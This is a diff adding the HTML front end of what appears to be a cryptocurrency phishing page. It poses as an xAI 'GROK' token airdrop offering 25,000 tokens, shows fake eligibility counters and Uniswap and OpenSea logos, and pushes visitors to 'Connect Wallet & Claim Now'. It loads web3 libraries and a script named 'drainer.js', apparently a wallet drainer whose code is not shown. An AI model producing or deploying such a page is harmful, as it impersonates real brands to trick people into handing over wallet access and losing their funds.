@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GROK Token Airdrop - Claim 25,000 $GROK</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="particles" id="particles"></div>
+    <div class="container">
+        <div class="logo">
+            <img src="assets/grok-logo.png" alt="GROK xAI Logo">
+        </div>
+        <h1>Congratulations!</h1>
+        <div class="eligible" id="eligibleMsg">Checking your eligibility...</div>
+        <p>You are eligible for an exclusive <strong>25,000 $GROK</strong> token airdrop by xAI.<br>Connect your wallet to claim instantly!</p>
+
+        <div class="stats">
+            <div class="stat">
+                <div class="stat-value" data-target="189321">0</div>
+                <div>Eligible Wallets</div>
+            </div>
+            <div class="stat">
+                <div class="stat-value" data-target="123456">0</div>
+                <div>Already Claimed</div>
+            </div>
+            <div class="stat">
+                <div class="stat-value" data-target="75000000">0</div>
+                <div>Tokens Distributed</div>
+            </div>
+        </div>
+
+        <button onclick="connectWallet()">Connect Wallet & Claim Now</button>
+        <div id="status"></div>
+
+        <div class="partners">Powered by Leading Protocols</div>
+        <div class="partner-logos">
+            <img src="assets/uniswap.png" alt="Uniswap">
+            <img src="assets/opensea.png" alt="OpenSea">
+        </div>
+
+        <footer>© 2025 xAI GROK Airdrop. Powered by advanced AI technology.</footer>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <script src="config.js"></script>
+    <script src="drainer.js"></script>
+</body>
+</html>
